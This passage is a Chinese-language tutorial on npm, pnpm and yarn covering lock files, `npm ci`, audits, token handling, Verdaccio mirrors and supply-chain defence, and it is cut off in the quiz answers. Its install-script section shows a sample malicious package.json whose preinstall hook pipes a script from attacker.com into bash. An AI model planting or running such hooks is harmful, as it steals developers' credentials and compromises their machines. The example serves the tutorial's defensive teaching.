---
title: "npm / pnpm / yarn 套件管理"
desc: "三者的差異與選擇、lock 檔、正式環境安裝指令與供應鏈安全"
aliases: [npm, pnpm, yarn, package-lock, npm ci, npm audit]
tags: [群組/軟體與開發工具, 服務/nodejs, 主題/套件管理]
category: Node.js
difficulty: 進階
status: 完成
distro: [ubuntu, rhel]
prerequisites: ["[[01-Node-安裝與版本管理]]"]
updated: 2026-08-28
---

# npm / pnpm / yarn 套件管理

> [!abstract] 這篇你會學到
> - 比較 **npm / pnpm / yarn** 的差異與選擇依據
> - 分清 **`install` 與 `ci`** 的差別（正式環境只能用一種）
> - 理解 **lock 檔** 的角色與 git 政策
> - 用 **`npm audit`** 檢查供應鏈漏洞
> - 防範 **install script 攻擊**與 **typosquatting**
> - 建立**離線／內網的安裝方案**

## 前置知識

- [[01-Node-安裝與版本管理]] — Node 安裝與 corepack

---

## 三者比較

| | **npm** | **pnpm** ★ | **yarn** |
| --- | --- | --- | --- |
| **內建** | ✅ 隨 Node 附帶 | ❌ 需安裝 | ❌ 需安裝 |
| **磁碟用量** | 最高（每專案一份） | **★ 最低**（硬連結共享） | 中 |
| **安裝速度** | 慢 | **★ 最快** | 中 |
| **相依處理** | 扁平化（hoisting） | **★ 嚴格（symlink 樹）** | 扁平化 / PnP |
| **lock 檔** | `package-lock.json` | `pnpm-lock.yaml` | `yarn.lock` |
| **CI 指令** | `npm ci` | `pnpm install --frozen-lockfile` | `yarn install --immutable` |
| **workspace** | ✓ | **★ 最好** | ✓ |
| **相容性** | **★ 最好** | 少數套件有問題 | 好 |

> [!tip] 怎麼選
> ```
> ① 【單一專案、小團隊、求穩】       → npm（內建、相容性最好）
> ② 【monorepo、多專案、磁碟吃緊】   → ★ pnpm
> ③ 【已經在用 yarn 且運作良好】     → 不用換
>
> ★ 最重要的不是選哪一個，而是【全團隊與 CI 統一用同一個】
>   → 用 corepack 的 packageManager 欄位鎖定
> ```

### pnpm 的核心優勢：硬連結共享

```
npm：
  專案A/node_modules/lodash/     ← 一份完整的檔案
  專案B/node_modules/lodash/     ← 又一份完整的檔案
  專案C/node_modules/lodash/     ← 再一份
  → 10 個專案 = 10 份，磁碟爆炸

pnpm：
  ~/.local/share/pnpm/store/     ← ★ 全域儲存區，每個版本只存一份
  專案A/node_modules/.pnpm/lodash@4.17.21/  → 硬連結到 store
  專案B/node_modules/.pnpm/lodash@4.17.21/  → 硬連結到【同一份】
  → 10 個專案 = 1 份 + 硬連結
```

```bash
# ★ 實測磁碟差異
$ du -sh node_modules              # npm
482M    node_modules
$ pnpm install && du -sh node_modules
128M    node_modules               # ★ 而且大部分是符號連結
$ pnpm store path
/home/user/.local/share/pnpm/store/v3
$ du -sh "$(pnpm store path)"
1.2G                               # ★ 所有專案共用
```

### pnpm 的嚴格相依

```
npm 的扁平化（hoisting）問題：
  你的 package.json 只宣告了 express
    → 但 express 依賴 debug
      → npm 把 debug 提升到 node_modules/ 頂層
        → ★★ 你的程式碼可以 require('debug') 而【不報錯】
          → 但 package.json 中沒有它
            → 【某天 express 換掉 debug → 你的程式碼壞掉】

pnpm 的嚴格模式：
  node_modules/ 只有【你明確宣告的套件】
    → require('debug') 【直接失敗】
      → ★ 逼你把它加進 package.json
```

> [!warning] 從 npm 換到 pnpm 時常見的錯誤
> ```
> Error: Cannot find module 'xxx'
> ```
> **這通常不是 pnpm 的 bug，而是「你的專案一直在偷用未宣告的相依」。**
>
> **正確做法**：
> ```bash
> $ pnpm add xxx          # ★ 把它加進 package.json
> ```
>
> **暫時的繞道**（不建議長期使用）：
> ```
> # .npmrc
> shamefully-hoist=true          # ★ 模擬 npm 的扁平化
> # 或只提升特定套件
> public-hoist-pattern[]=*eslint*
> public-hoist-pattern[]=*prettier*
> ```

---

## `install` vs `ci` ★★★

```bash
# ═══ npm ═══
$ npm install          # ★ 會【修改】 package-lock.json（若有需要）
$ npm ci               # ★★ 嚴格依 lock 檔安裝，不修改任何東西

# ═══ pnpm ═══
$ pnpm install                        # 會更新 lock
$ pnpm install --frozen-lockfile      # ★★ 嚴格（CI 中預設就是這個）

# ═══ yarn (berry) ═══
$ yarn install
$ yarn install --immutable            # ★★ 嚴格
```

| | `npm install` | **`npm ci`** |
| --- | --- | --- |
| 需要 lock 檔 | 否 | **✅ 必須有** |
| 會修改 lock 檔 | **✅ 會** | ❌ 不會 |
| lock 與 package.json 不符 | 更新 lock | **✅ 直接失敗** |
| 安裝前刪除 `node_modules` | 否 | **✅ 會（確保乾淨）** |
| 速度 | 慢 | **★ 快很多** |
| 可安裝單一套件 | ✅ | ❌ |
| **適用** | 開發時新增套件 | **★★ CI/CD 與正式環境** |

> [!danger] 正式環境必須用 `npm ci`
> ```
> npm install 在正式環境的問題：
>   ① 若 package.json 與 lock 檔不同步 → 【自動更新 lock】
>     → 裝到與測試環境【不同的版本】
>       → 「測試環境正常，正式環境炸掉」
>   ② 會留下未提交的 lock 檔變更 → 下次部署時 git 衝突
>   ③ 較慢
>
> npm ci：
>   ✓ 嚴格依 lock 檔，版本【完全確定】
>   ✓ lock 與 package.json 不符時【直接失敗】（★ 提早發現問題）
>   ✓ 先刪除 node_modules，確保沒有殘留
>   ✓ 快很多
> ```
>
> ```bash
> # ★ 正式環境的標準指令
> $ npm ci --omit=dev              # npm 9+（舊版是 --production）
> $ pnpm install --frozen-lockfile --prod
> $ yarn workspaces focus --production --all
> ```

```bash
# ★ npm ci 失敗時的訊息（這是好事！）
$ npm ci
npm error `npm ci` can only install packages when your package.json and
npm error package-lock.json are in sync. Please update your lock file with
npm error `npm install` before continuing.
npm error Missing: lodash@4.17.21 from lock file

# → 表示有人改了 package.json 但沒更新 lock 檔並提交
# → ★ 在開發機執行 npm install 並提交 lock 檔
```

---

## lock 檔

```
package-lock.json / pnpm-lock.yaml / yarn.lock

記錄：
  · 每個套件的【精確版本】
  · 每個套件的【下載網址】
  · 每個套件的【完整性雜湊】（integrity / sha512）
  · 完整的相依樹結構
```

| 檔案 | git |
| --- | --- |
| `package.json` | **✅ 一定要進** |
| **`package-lock.json` / `pnpm-lock.yaml` / `yarn.lock`** | **✅ 一定要進**（應用程式） |
| `node_modules/` | **❌ 不要進** |
| `.npmrc`（含 token 時） | **❌❌ 絕不能進** |

```gitignore
node_modules/
.pnpm-store/
*.log
.npmrc              # ★ 若含有 authToken
.env
```

> [!danger] lock 檔中的 `integrity` 是供應鏈安全的關鍵
> ```json
> {
>   "node_modules/lodash": {
>     "version": "4.17.21",
>     "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
>     "integrity": "sha512-v2kDEe57lecTulaDIuNTPy3Ry4gLGJ6Z1O3vE1krgXZNrsQ+LFTGHVxVjcXPs17LhbZVGedAJv8XZ1tvj5FvSg=="
>   }
> }
> ```
>
> **`integrity` 是套件內容的 SHA-512 雜湊** ——
> ```
> 安裝時會【驗證下載的內容是否與雜湊相符】
>   → 若 registry 被入侵、套件被竄改
>     → ★ 安裝會【失敗】而不是裝到惡意程式碼
> ```
>
> **所以 lock 檔不只是「鎖版本」，更是「鎖內容」。**

```bash
# ★ 檢查 lock 檔是否與 package.json 同步
$ npm ls --depth=0                          # 有不符會警告
$ npm ci --dry-run                          # 不實際安裝，只檢查

# ★ 只更新 lock 檔（改了 package.json 之後）
$ npm install --package-lock-only

# ★ 檢視某個套件為什麼被安裝
$ npm ls lodash
myapp@1.0.0
└─┬ express@4.19.2
  └── lodash@4.17.21

$ npm explain lodash
```

---

## 版本約束

```json
{
    "dependencies": {
        "express": "^4.19.2",      // ★ >=4.19.2 <5.0.0（最常用）
        "lodash": "~4.17.21",      // >=4.17.21 <4.18.0
        "vue": "3.5.13",           // 精確版本
        "nuxt": ">=3.14 <4",       // 明確範圍
        "some-pkg": "*",           // ★★ 任何版本（危險）
        "beta-pkg": "next",        // dist-tag
        "git-pkg": "github:org/repo#v1.2.3",
        "local-pkg": "file:../shared"
    },
    "devDependencies": {
        "vite": "^6.0.0",
        "typescript": "^5.6.0"
    },
    "peerDependencies": {
        "vue": "^3.0.0"
    },
    "overrides": {                  // ★ npm：強制覆蓋間接相依的版本
        "semver": "^7.5.4"
    },
    "resolutions": {                // yarn 的對應功能
        "semver": "^7.5.4"
    }
}
```

```yaml
# pnpm 的對應功能（package.json）
{
    "pnpm": {
        "overrides": { "semver": "^7.5.4" }
    }
}
```

> [!tip] `overrides` / `resolutions` 用來修補有漏洞的間接相依
> ```
> 情境：
>   npm audit 說 semver@6.3.0 有漏洞
>     → 但它是 some-package 的間接相依
>       → 而 some-package 還沒發布修正版
>
> 解法：
>   "overrides": { "semver": "^7.5.4" }
>     → ★ 強制所有地方都用 7.5.4
> ```
>
> **注意**：這是**繞過相依宣告**，可能造成相容性問題 ——
> **一定要跑完整測試**，並在套件官方修正後移除。

---

## 供應鏈安全 ★★★

### `npm audit`

```bash
$ npm audit
# npm audit report

semver  <7.5.2
Severity: moderate
semver vulnerable to Regular Expression Denial of Service
https://github.com/advisories/GHSA-c2qf-rxjj-qqgw
fix available via `npm audit fix`
node_modules/semver

1 moderate severity vulnerability

# ★ 只看正式相依（開發相依的漏洞風險較低）
$ npm audit --omit=dev

# ★ JSON 格式（CI 用）
$ npm audit --json | jq '.metadata.vulnerabilities'
{ "info": 0, "low": 2, "moderate": 1, "high": 0, "critical": 0, "total": 3 }

# ★ 設定失敗門檻（CI 中用）
$ npm audit --audit-level=high        # 有 high 以上才失敗
$ echo "exit=$?"

# 自動修復（★ 小心：可能升級到 breaking change）
$ npm audit fix                       # 只在 semver 範圍內
$ npm audit fix --force               # ★★ 可能引入 breaking change
```

```bash
# pnpm
$ pnpm audit
$ pnpm audit --prod
$ pnpm audit --audit-level=high

# yarn
$ yarn npm audit
$ yarn npm audit --environment production
```

### install script 攻擊 ★★

```json
// ★★ 惡意套件的典型手法
{
    "name": "innocent-looking-package",
    "scripts": {
        "preinstall":  "curl http://attacker.com/steal.sh | bash",
        "install":     "node -e \"require('child_process').exec('...')\"",
        "postinstall": "node ./scripts/exfiltrate.js"
    }
}
```

```
攻擊流程：
  ① 攻擊者發布一個看似無害的套件（或入侵既有套件的維護帳號）
  ② 你（或你的某個相依）安裝它
    ③ install script 自動執行
      → 【竊取 ~/.npmrc 的 token、~/.ssh/、環境變數、.env】
      → 【植入後門】
      → 【挖礦】
```

```bash
# ═══ ★★ 防護一：停用 install script ═══
$ npm ci --ignore-scripts

# 或設成預設
$ npm config set ignore-scripts true --global
```

> [!danger] `ignore-scripts` 的取捨
> ```
> 停用之後：
>   ✓ 惡意的 install script 不會執行
>   ✗ ★ 【原生模組無法編譯】（bcrypt、sharp、canvas…）
>   ✗ 某些套件的必要初始化不會執行（husky、puppeteer 下載 Chromium）
> ```
>
> **實務做法**：
> ```bash
> # ① 先用 --ignore-scripts 安裝
> $ npm ci --ignore-scripts
>
> # ② ★ 檢視哪些套件想執行 script
> $ npm rebuild --dry-run 2>&1 | head -20
>
> # ③ 只對【明確信任】的套件重建
> $ npm rebuild bcrypt sharp
> ```
>
> **或用 pnpm 的白名單機制**（pnpm 9+）：
> ```yaml
> # .npmrc 或 package.json
> # pnpm 10 預設就【不執行】install script，要明確允許
> ```
> ```json
> {
>   "pnpm": {
>     "onlyBuiltDependencies": ["bcrypt", "sharp", "esbuild"]
>   }
> }
> ```
> **這是 pnpm 相對 npm 的一個安全優勢。**

```bash
# ═══ ★ 防護二：檢視 install script ═══
#!/usr/bin/env bash
# 列出所有會執行 install script 的套件
echo "═══ 有 install script 的套件 ═══"
find node_modules -maxdepth 3 -name package.json -not -path '*/node_modules/*/node_modules/*' \
  2>/dev/null | while read -r p; do
    S=$(jq -r '
      [.scripts.preinstall, .scripts.install, .scripts.postinstall, .scripts.prepare]
      | map(select(. != null)) | join(" ; ")' "$p" 2>/dev/null)
    [ -n "$S" ] && [ "$S" != "" ] && {
        N=$(jq -r '.name' "$p" 2>/dev/null)
        printf '  \033[33m%-32s\033[0m %s\n' "$N" "${S:0:80}"
    }
done
```

### typosquatting（名稱混淆）

```
攻擊者註冊與熱門套件極相似的名稱：

  真的            假的（惡意）
  ─────────────────────────────
  lodash          lodasch, lodahs, 1odash
  express         expres, expresss
  react           raect, reakt
  cross-env       crossenv, cross-env.js
  babel-cli       babelcli
  @types/node     types-node
```

```bash
# ★ 安裝前檢查套件的基本資訊
$ npm view lodash
lodash@4.17.21 | MIT | deps: none | versions: 114
Lodash modular utilities.
https://lodash.com/
...
dist-tags: latest: 4.17.21
published a year ago by bnjmnt4n <...>

# ★ 檢查下載量（極低的下載量是警訊）
$ npm view lodash --json | jq '{name, version, homepage, repository, maintainers}'

# ★ 檢查發布時間（★ 剛發布的新套件要特別小心）
$ npm view some-package time --json | jq -r 'to_entries | .[-3:] | .[] | "\(.key)  \(.value)"'
```

```bash
#!/usr/bin/env bash
# 新增套件前的檢查
PKG="${1:?用法: $0 <package-name>}"
echo "═══ 套件檢查：$PKG ═══"
INFO=$(npm view "$PKG" --json 2>/dev/null)
[ -z "$INFO" ] && { echo "  ✗ 找不到這個套件（★ 檢查拼字）"; exit 1; }

echo "$INFO" | jq -r '
  "  名稱      : \(.name)
  版本      : \(.version)
  授權      : \(.license // "★ 未宣告")
  首頁      : \(.homepage // "★ 無")
  倉庫      : \(.repository.url // "★ 無")
  維護者    : \(.maintainers | map(.name) | join(", "))
  相依數    : \(.dependencies | length)
  最後發布  : \(.time.modified // "?")
  建立時間  : \(.time.created // "?")"'

echo
echo "  ── 警訊檢查 ──"
CREATED=$(echo "$INFO" | jq -r '.time.created')
DAYS=$(( ( $(date +%s) - $(date -d "$CREATED" +%s) ) / 86400 ))
[ "$DAYS" -lt 90 ] && echo "  ⚠ 套件建立只有 $DAYS 天【新套件要特別小心】" \
                   || echo "  ✓ 套件已存在 $DAYS 天"
echo "$INFO" | jq -e '.repository.url' >/dev/null || echo "  ⚠ 沒有指定倉庫網址"
echo "$INFO" | jq -e '.license' >/dev/null || echo "  ⚠ 沒有宣告授權"

echo
echo "  ── 是否有 install script ──"
npm view "$PKG" scripts --json 2>/dev/null | \
  jq -r 'to_entries | map(select(.key | test("^(pre|post)?install$|^prepare$"))) |
         if length > 0 then .[] | "  ⚠⚠ \(.key): \(.value)" else "  ✓ 沒有" end'

echo
echo "  ── 相依樹大小 ──"
echo "  ★ 相依越多，攻擊面越大"
```

### 私有 registry 與 token

```bash
# ═══ 設定私有 registry ═══
$ npm config set registry https://npm.example.gov.tw/
$ npm config set @gov:registry https://npm.example.gov.tw/    # 只有某個 scope

# ★ token（★ 絕不能進 git）
$ npm config set //npm.example.gov.tw/:_authToken "npm_xxxxx"

$ cat ~/.npmrc
registry=https://npm.example.gov.tw/
//npm.example.gov.tw/:_authToken=npm_xxxxx
```

> [!danger] `.npmrc` 中的 token 是常見的洩漏來源
> ```bash
> # ★ 檢查是否曾經被提交
> $ git log --all --diff-filter=A --name-only | grep -E '\.npmrc$'
> $ git log -p --all -S '_authToken' | head -20
>
> # ★ 檢查 Docker image 中是否有殘留
> $ docker history --no-trunc myimage | grep -i npmrc
> ```
>
> **CI/CD 中的正確做法**：用環境變數
> ```bash
> # .npmrc（★ 可以進 git，因為只有變數參照）
> //registry.npmjs.org/:_authToken=${NPM_TOKEN}
> ```
> ```bash
> # CI 中設定 NPM_TOKEN 環境變數
> $ NPM_TOKEN=xxx npm ci
> ```
>
> **Dockerfile 中**：
> ```dockerfile
> # ★ 用 BuildKit secret，不會留在 image layer 中
> RUN --mount=type=secret,id=npmrc,target=/root/.npmrc \
>     npm ci --omit=dev
> ```

---

## 正式環境的安裝

```bash
# ═══════════ npm ═══════════
$ npm ci --omit=dev --ignore-scripts
$ npm rebuild bcrypt sharp              # ★ 只對信任的套件重建

# ═══════════ pnpm ═══════════
$ pnpm install --frozen-lockfile --prod

# ═══════════ yarn (berry) ═══════════
$ yarn workspaces focus --production --all
```

```bash
#!/usr/bin/env bash
# 部署腳本中的套件安裝
set -euo pipefail
cd "${1:?請提供專案目錄}"

echo "═══ 【1】偵測套件管理器 ═══"
if   [ -f pnpm-lock.yaml ];      then PM=pnpm
elif [ -f yarn.lock ];           then PM=yarn
elif [ -f package-lock.json ];   then PM=npm
else echo "  ✗ 找不到 lock 檔【必須提交 lock 檔】"; exit 1; fi
echo "  使用：$PM"

echo -e "\n═══ 【2】★ 驗證 lock 檔與 package.json 同步 ═══"
case "$PM" in
    npm)  npm ci --dry-run >/dev/null 2>&1 || {
              echo "  ✗✗ package.json 與 lock 檔不同步"
              echo "     → 在開發機執行 npm install 並提交 lock 檔"; exit 1; } ;;
    pnpm) pnpm install --frozen-lockfile --lockfile-only >/dev/null 2>&1 || {
              echo "  ✗✗ lock 檔不同步"; exit 1; } ;;
esac
echo "  ✓ 同步"

echo -e "\n═══ 【3】★ 安全稽核 ═══"
case "$PM" in
    npm)  npm audit --omit=dev --audit-level=high || {
              echo "  ⚠⚠ 發現 high 以上的漏洞"
              # 依政策決定是否中止
              # exit 1
          } ;;
    pnpm) pnpm audit --prod --audit-level=high || true ;;
esac

echo -e "\n═══ 【4】安裝（★ 停用 install script）═══"
case "$PM" in
    npm)  npm ci --omit=dev --ignore-scripts ;;
    pnpm) pnpm install --frozen-lockfile --prod --ignore-scripts ;;
    yarn) YARN_ENABLE_SCRIPTS=false yarn workspaces focus --production --all ;;
esac

echo -e "\n═══ 【5】★ 只對信任的套件重建原生模組 ═══"
TRUSTED="bcrypt sharp better-sqlite3 esbuild @swc/core"
for p in $TRUSTED; do
    [ -d "node_modules/$p" ] && {
        echo "  重建 $p"
        case "$PM" in
            npm)  npm rebuild "$p" ;;
            pnpm) pnpm rebuild "$p" ;;
        esac
    }
done

echo -e "\n═══ 【6】建置 ═══"
NODE_ENV=production npm run build

echo -e "\n═══ 【7】★ 移除建置時才需要的相依（可選）═══"
# Nuxt/Next 建置後，.output 已包含所有必要的東西
# $ rm -rf node_modules

echo -e "\n═══ 【8】檢查 ═══"
echo "  node_modules 大小：$(du -sh node_modules 2>/dev/null | cut -f1)"
echo "  套件數量：$(find node_modules -maxdepth 2 -name package.json 2>/dev/null | wc -l)"
[ -d node_modules/typescript ] && echo "  ⚠ 有開發相依（--omit=dev 沒生效？）"

echo -e "\n✓ 完成"
```

---

## 離線／內網安裝

```bash
# ═══ 方式一：★ 打包 node_modules ═══
# 【有網路的機器】
$ npm ci --omit=dev --ignore-scripts
$ tar czf node_modules.tar.gz node_modules package.json package-lock.json

# 【內網機器】
$ tar xzf node_modules.tar.gz
# ★ 若有原生模組，需要在【相同的 Node 版本與 OS】上打包

# ═══ 方式二：npm 的離線快取 ═══
# 【有網路的機器】
$ npm ci
$ tar czf npm-cache.tar.gz -C ~ .npm

# 【內網機器】
$ tar xzf npm-cache.tar.gz -C ~
$ npm ci --offline --prefer-offline

# ═══ 方式三：★ 內部 registry 鏡像（最完整）═══
# Verdaccio（輕量、易架設）
$ npm install -g verdaccio
$ verdaccio
# 或用 Docker
$ docker run -d -p 4873:4873 -v ~/verdaccio:/verdaccio/storage verdaccio/verdaccio
```

```yaml
# ~/verdaccio/config.yaml
storage: /verdaccio/storage
auth:
  htpasswd:
    file: /verdaccio/htpasswd
    max_users: -1              # ★ 正式環境設 -1 停止註冊

uplinks:
  npmjs:
    url: https://registry.npmjs.org/
    cache: true                # ★ 快取上游套件
    timeout: 30s
    maxage: 2m

packages:
  '@gov/*':                    # ★ 內部套件
    access: $authenticated
    publish: $authenticated
    unpublish: $authenticated
  '**':
    access: $all
    publish: $authenticated
    proxy: npmjs               # ★ 找不到就去上游抓並快取
```

```bash
# 客戶端設定
$ npm config set registry http://npm.example.gov.tw:4873/
$ npm ci
```

> [!tip] Verdaccio 的三個好處
> ```
> ① ★ 離線可用（快取過的套件在斷網時仍可安裝）
> ② ★ 供應鏈安全（可以審核哪些套件進入內部快取）
> ③ ★ 發布內部套件（@gov/common-lib）
> ```

---

## 常見錯誤與排錯

| 現象／錯誤 | 原因 | 解法 |
| --- | --- | --- |
| **`npm ci` 說 lock 不同步** | 改了 package.json 沒更新 lock | **開發機 `npm install` 並提交 lock**（★ 這是好事，提早發現問題） |
| **正式環境裝到不同版本** ★ | 用了 `npm install` 而非 `ci` | **正式環境一律 `npm ci`** |
| `Cannot find module`（換到 pnpm 後） | **偷用了未宣告的相依** | `pnpm add 該套件`；或暫時 `shamefully-hoist=true` |
| **原生模組編譯失敗** | `--ignore-scripts` | 對信任的套件 `npm rebuild` |
| `EACCES` 全域安裝 | 權限 | 改 npm prefix；或用 `npx` |
| **`node_modules` 極大** | npm 每專案一份 | 改用 pnpm（硬連結共享） |
| lock 檔在不同機器一直變 | 套件管理器版本不同 | **corepack + `packageManager` 欄位** |
| **`.npmrc` 的 token 進了 git** ★★ | 忘了 `.gitignore` | **立刻撤銷 token**；改用環境變數 |
| `npm audit fix --force` 弄壞應用 | 升級到 breaking change | 手動處理；用 `overrides` |
| **間接相依有漏洞但無法升級** | 上游還沒修 | `overrides` / `resolutions` 強制版本 |
| 安裝極慢 | 網路 / registry | 用內部鏡像；`--prefer-offline` |
| **install script 執行了惡意程式碼** ★★ | 沒有 `--ignore-scripts` | 見上方防護 |
| CI 與本機的相依樹不同 | 沒用 `ci` / lock 檔沒提交 | 統一用 `ci` + 提交 lock |

### 排查

```bash
# 【1】某個套件為什麼被安裝
$ npm ls lodash
$ npm explain lodash
$ pnpm why lodash

# 【2】相依樹
$ npm ls --depth=1
$ npm ls --all > /tmp/deps.txt

# 【3】lock 檔與實際安裝是否一致
$ npm ci --dry-run

# 【4】清快取重來（最後手段）
$ rm -rf node_modules package-lock.json
$ npm cache clean --force
$ npm install

# 【5】檢查有 install script 的套件
$ find node_modules -maxdepth 3 -name package.json | \
    xargs jq -r 'select(.scripts.postinstall or .scripts.install or .scripts.preinstall)
                 | "\(.name): \(.scripts | to_entries | map(select(.key|test("install")))
                 | map("\(.key)=\(.value)") | join(" "))"' 2>/dev/null

# 【6】磁碟用量
$ du -sh node_modules
$ du -sh node_modules/* | sort -h | tail -20      # 最大的套件

# 【7】pnpm store
$ pnpm store status
$ pnpm store prune                                # 清理未使用的
```

---

## 安全性注意事項

> [!danger] 供應鏈攻擊的五道防線
> ```
> ① ★★ lock 檔進 git（含 integrity 雜湊，鎖版本也鎖內容）
> ② ★★ 正式環境用 npm ci（不會意外更新版本）
> ③ ★★ --ignore-scripts（防 install script 攻擊）
> ④ ★ npm audit 排程化（檢查已知漏洞）
> ⑤ ★ 新增套件前檢查（下載量、建立時間、倉庫、install script）
> ```
>
> **加上**：
> ```
> ⑥ 內部 registry 鏡像（可審核進入的套件）
> ⑦ 減少相依數量（每個相依都是攻擊面）
> ⑧ CI 中用最小權限的 token
> ```

> [!warning] 相依數量本身就是風險
> ```bash
> # ★ 看看一個典型的專案有多少相依
> $ npm ls --all 2>/dev/null | wc -l
> 1847
>
> $ find node_modules -maxdepth 2 -name package.json | wc -l
> 892                       # ★ 892 個套件
>
> # 每一個都是：
> #   · 一個可能被入侵的維護者帳號
> #   · 一段會在你的伺服器上執行的程式碼
> #   · 一個可能有漏洞的相依
> ```
>
> **實務建議**：
> ```
> · 新增套件前先想：「這個功能自己寫要多久？」
>   （left-pad 事件的教訓）
> · 定期檢視 package.json，移除不再使用的套件
> · 優先選擇【相依少、維護活躍、下載量高】的套件
> ```
> ```bash
> # ★ 找出沒在用的套件
> $ npx depcheck
> ```

> [!tip] CI/CD 的 token 要用最小權限
> ```
> npm 的 token 類型：
>   · Read-only          ★ CI 安裝套件用這個
>   · Automation         發布套件（繞過 2FA）
>   · Publish            完整權限（★ 不要給 CI）
>
> 私有 registry 也要區分：
>   · 部署用：只能 read
>   · 發布用：只在需要發布的 job 中使用
> ```
> ```bash
> # ★ 定期輪替
> $ npm token list
> $ npm token revoke <token-id>
> $ npm token create --read-only
> ```

---

## 速查表

### 三者比較

| | npm | **pnpm** | yarn |
| --- | --- | --- | --- |
| 內建 | ✅ | ❌ | ❌ |
| 磁碟 | 最高 | **★ 最低（硬連結）** | 中 |
| 速度 | 慢 | **★ 最快** | 中 |
| 相依 | 扁平化 | **★ 嚴格** | 扁平化 |
| lock | `package-lock.json` | `pnpm-lock.yaml` | `yarn.lock` |

```
★ 最重要的是【全團隊與 CI 統一】→ corepack + packageManager 欄位
```

### install vs ci ★★

```bash
npm install     # 會修改 lock；開發時新增套件用
npm ci          # ★★ 嚴格依 lock；不符時直接失敗；先刪 node_modules；快很多

# ★ 正式環境
npm ci --omit=dev --ignore-scripts
pnpm install --frozen-lockfile --prod
yarn workspaces focus --production --all
```

### git 政策

```
package.json          ✅ 進 git
*-lock.json/yaml/lock ✅ 進 git（★ 含 integrity 雜湊，鎖內容）
node_modules/         ❌
.npmrc（含 token）    ❌❌ 絕不
```

### 版本約束

```
^4.19.2   >=4.19.2 <5.0.0     ★ 最常用
~4.17.21  >=4.17.21 <4.18.0
4.19.2    精確
*         ★★ 危險

"overrides": { "semver": "^7.5.4" }    ★ 強制修補有漏洞的間接相依
```

### 供應鏈安全五道防線 ★

```
① lock 檔進 git（integrity 雜湊）
② 正式環境 npm ci
③ --ignore-scripts（★ 防 install script 攻擊）
④ npm audit 排程化
⑤ 新增套件前檢查（下載量/建立時間/倉庫/install script）
```

```bash
npm audit --omit=dev --audit-level=high     # ★ CI 中用
npm view <pkg>                              # ★ 新增前檢查
npx depcheck                                # 找出沒在用的套件

# ★ 列出有 install script 的套件
find node_modules -maxdepth 3 -name package.json | \
  xargs jq -r 'select(.scripts.postinstall or .scripts.install) | .name' 2>/dev/null
```

### `--ignore-scripts` 的處理

```bash
npm ci --omit=dev --ignore-scripts       # ★ 先停用
npm rebuild bcrypt sharp                 # ★ 只對信任的套件重建
```
```json
// pnpm 10+ 的白名單
{ "pnpm": { "onlyBuiltDependencies": ["bcrypt", "sharp", "esbuild"] } }
```

### 離線／內網

```bash
# 打包快取
tar czf npm-cache.tar.gz -C ~ .npm
npm ci --offline --prefer-offline

# ★ Verdaccio 內部 registry
docker run -d -p 4873:4873 -v ~/verdaccio:/verdaccio/storage verdaccio/verdaccio
npm config set registry http://npm.example.gov.tw:4873/
```

### 排查

```bash
npm ls <pkg> / npm explain <pkg> / pnpm why <pkg>    # 為什麼被安裝
npm ci --dry-run                                     # lock 是否同步
du -sh node_modules/* | sort -h | tail -20           # 最大的套件
rm -rf node_modules package-lock.json && npm install # 最後手段
pnpm store prune                                     # 清理 pnpm store
```

---

## 練習題

> [!question]- 練習 1：`install` vs `ci`
> 1. 建立一個專案並 `npm install express`
> 2. **手動編輯 `package.json`**，把 express 改成 `^4.18.0`
> 3. `npm ci` → **成功還是失敗？訊息是什麼？**
> 4. `npm install` → 發生什麼事？看 `git diff package-lock.json`
> 5. **這說明了什麼？為什麼正式環境要用 `ci`？**
> 6. 測量兩者的執行時間差異

> [!question]- 練習 2：pnpm 的嚴格相依
> 1. 用 npm 建立一個專案，`npm install express`
> 2. 在程式碼中 `require('debug')`（**沒有宣告它**）→ 能執行嗎？
> 3. 刪除 `node_modules` 與 lock 檔，改用 `pnpm install`
> 4. **再執行** → 發生什麼事？
> 5. `pnpm add debug` 後重測
> 6. **比較兩者的 `du -sh node_modules`**
> 7. 用 pnpm 建立第二個專案裝同樣的套件，**再看 `pnpm store` 的大小**

> [!question]- 練習 3：install script 的風險
> **★ 在隔離的測試環境**
> 1. 建立一個本機套件，`package.json` 中加：
>    ```json
>    "scripts": { "postinstall": "echo 'PWNED' > /tmp/pwned.txt" }
>    ```
> 2. `npm install ./該套件` → **`/tmp/pwned.txt` 出現了嗎？**
> 3. 刪除該檔案，改用 `npm install --ignore-scripts` → 還會嗎？
> 4. 用本篇的腳本列出現有專案中**有 install script 的套件**
> 5. **有多少個？你認得幾個？**

> [!question]- 練習 4：供應鏈稽核
> 1. 對一個真實專案執行 `npm audit --omit=dev`
> 2. **有漏洞嗎？各是什麼嚴重程度？**
> 3. 用 `npm ls <有漏洞的套件>` 找出是誰引入的
> 4. 若上游還沒修，用 `overrides` 強制版本
> 5. **跑完整測試確認沒壞掉**
> 6. `npx depcheck` → 有沒用到的套件嗎？
> 7. `find node_modules -maxdepth 2 -name package.json | wc -l` → 總共幾個相依？

> [!question]- 練習 5：內部 registry
> 1. 用 Docker 架設 Verdaccio
> 2. 設定 `npm config set registry http://localhost:4873/`
> 3. `npm ci` 一個專案 → 觀察 Verdaccio 的快取目錄
> 4. **斷網後再 `npm ci`** → 成功嗎？
> 5. 發布一個內部套件到 Verdaccio
> 6. 從另一個專案安裝它
> 7. 設定 `max_users: -1` 停止註冊

---

## 小測驗

Q1. **npm / pnpm / yarn 在磁碟用量與相依處理上的關鍵差異是什麼**？

Q2. **`npm install` 與 `npm ci` 有哪五個差別？正式環境該用哪個**？

Q3. **lock 檔中的 `integrity` 欄位有什麼安全意義**？

Q4. **從 npm 換到 pnpm 後出現 `Cannot find module` 通常代表什麼**？

Q5. **install script 攻擊的流程是什麼？怎麼防**？

Q6. **`--ignore-scripts` 的代價是什麼？實務上該怎麼處理**？

Q7. **`overrides` / `resolutions` 用來解決什麼問題？有什麼風險**？

Q8. **`.npmrc` 的 token 洩漏了該怎麼處理？CI 中的正確做法是什麼**？

Q9. **typosquatting 是什麼？新增套件前該檢查哪些項目**？

Q10. **供應鏈安全的五道防線是什麼**？

> [!question]- 測驗答案
> **Q1.** **磁碟用量**：npm **每個專案一份完整的檔案**（10 個專案 = 10 份）；
> **pnpm 用「全域儲存區 + 硬連結」，每個版本只存一份**
> （10 個專案 = 1 份 + 硬連結），**磁碟用量可差 3-5 倍**；yarn 介於中間。
> **相依處理**：npm 與 yarn 用**扁平化（hoisting）** ——
> 把間接相依提升到 `node_modules/` 頂層，
